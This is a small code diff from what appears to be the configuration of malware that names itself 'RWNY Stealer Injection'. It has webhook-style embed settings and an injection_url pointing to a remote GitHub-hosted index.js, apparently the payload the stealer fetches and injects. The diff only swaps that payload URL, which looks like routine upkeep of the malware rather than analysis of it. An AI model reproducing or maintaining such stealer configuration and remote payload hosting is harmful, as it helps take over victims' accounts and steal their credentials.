@@ -14,7 +14,7 @@ const config = {
   embed_name: 'RWNY Stealer Injection', 
   embed_icon: 'https://i.imgur.com/2IkmklL.jpeg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/ahmetvx/index/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/ahmetvx/asdasdas/main/index.js', 
   /**
    
    **/
